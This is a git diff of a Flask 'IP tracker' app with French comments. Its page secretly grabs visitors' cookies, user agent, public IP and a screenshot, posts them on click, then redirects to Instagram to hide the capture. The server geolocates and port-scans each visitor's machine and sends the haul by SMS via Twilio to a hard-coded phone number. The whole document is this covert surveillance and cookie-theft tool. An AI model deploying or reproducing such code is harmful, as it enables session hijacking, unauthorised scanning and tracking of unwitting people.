@@ -2,7 +2,6 @@ from flask import Flask, request, jsonify
 from twilio.rest import Client
 import requests
 import socket
-import nmap
 
 app = Flask(__name__)
 
@@ -14,7 +13,7 @@ to_number = '+33635960569'
 
 client = Client(account_sid, auth_token)
 
-# Fonction pour récupérer la géolocalisation
+# 🔍 Géolocalisation IP
 def get_geolocation(ip):
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}").json()
@@ -22,38 +21,47 @@ def get_geolocation(ip):
     except:
         return "Localisation impossible"
 
-# Fonction pour scanner les ports
-def scan_ports(ip):
-    nm = nmap.PortScanner()
-    nm.scan(ip, '1-65535')  # Scanne tous les ports possibles
-    open_ports = nm[ip].all_tcp()  # Liste tous les ports TCP ouverts
+# 🔓 Scan des ports courants
+def scan_ports(ip, ports=[21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 8080]):
+    open_ports = []
+    for port in ports:
+        try:
+            sock = socket.socket()
+            sock.settimeout(0.5)
+            result = sock.connect_ex((ip, port))
+            if result == 0:
+                open_ports.append(port)
+            sock.close()
+        except:
+            continue
     return open_ports
 
-# Fonction d'envoi d'alertes par SMS
-def send_alert(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y):
+# 📩 Envoi SMS via Twilio
+def send_sms(ip, user_agent, cookies, screenshot, click_x, click_y):
     location = get_geolocation(ip)
     ports = scan_ports(ip)
 
-    # Préparation du message
     message_body = f"""
-    Nouvelle visite !
-    IP : {ip}
-    User-Agent : {user_agent}
-    Cookies : {cookies}
-    Capture d'écran : {screenshot[:100]}...
-    Géolocalisation GPS : {latitude}, {longitude}
-    Cliquez à : ({click_x}, {click_y})
-    Ports ouverts : {ports if ports else 'Aucun trouvé'}
-    Localisation : {location}
+[IP TRACKER - INFOS]
+IP publique : {ip}
+Localisation : {location}
+Ports ouverts : {ports if ports else 'Aucun trouvé'}
+User-Agent : {user_agent}
+Cookies : {cookies}
+Clic détecté à : ({click_x}, {click_y})
+Capture écran (début base64) : {screenshot[:50]}...
     """
-    
-    # Envoi de l'alerte par SMS
-    message = client.messages.create(
-        body=message_body,
-        from_=from_number,
-        to=to_number
-    )
+    try:
+        message = client.messages.create(
+            body=message_body,
+            from_=from_number,
+            to=to_number
+        )
+        print(f"[+] SMS envoyé : {message.sid}")
+    except Exception as e:
+        print(f"[!] Erreur envoi SMS : {e}")
 
+# 🖼️ Page principale HTML avec script de tracking
 @app.route('/')
 def index():
     return '''
@@ -62,33 +70,28 @@ def index():
     <body>
         <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
         <script>
-            const cookies = document.cookie; // Récupère les cookies de l'utilisateur
+            const cookies = document.cookie;
 
             fetch("https://api.ipify.org?format=json")
             .then(res => res.json())
             .then(data => {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
+                html2canvas(document.body).then(canvas => {
+                    const screenshot = canvas.toDataURL();
 
-                    html2canvas(document.body).then(canvas => {
-                        const screenshot = canvas.toDataURL(); // Capture l'écran en base64
-
-                        document.body.addEventListener('click', function(event) {
-                            fetch("/log", {
-                                method: "POST",
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    ip: data.ip,
-                                    ua: navigator.userAgent,
-                                    cookies: cookies, // Envoie les cookies
-                                    screenshot: screenshot, // Envoie la capture
-                                    latitude: latitude, // Envoie la latitude
-                                    longitude: longitude, // Envoie la longitude
-                                    click_x: event.pageX, // Envoie les coordonnées du clic
-                                    click_y: event.pageY  // Envoie les coordonnées du clic
-                                })
-                            });
+                    document.body.addEventListener('click', function(event) {
+                        fetch("/log", {
+                            method: "POST",
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                ip: data.ip,
+                                ua: navigator.userAgent,
+                                cookies: cookies,
+                                screenshot: screenshot,
+                                click_x: event.pageX,
+                                click_y: event.pageY
+                            })
+                        }).then(() => {
+                            window.location.href = "https://www.instagram.com";
                         });
                     });
                 });
@@ -98,6 +101,7 @@ def index():
     </html>
     '''
 
+# 🔐 Endpoint de réception des données
 @app.route('/log', methods=['POST'])
 def log():
     data = request.get_json()
@@ -105,13 +109,10 @@ def log():
     user_agent = data.get('ua')
     cookies = data.get('cookies')
     screenshot = data.get('screenshot')
-    latitude = data.get('latitude')
-    longitude = data.get('longitude')
     click_x = data.get('click_x')
     click_y = data.get('click_y')
 
-    # Envoie de l'alerte par SMS
-    send_alert(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y)
+    send_sms(ip, user_agent, cookies, screenshot, click_x, click_y)
 
     return jsonify({"status": "ok"})
 
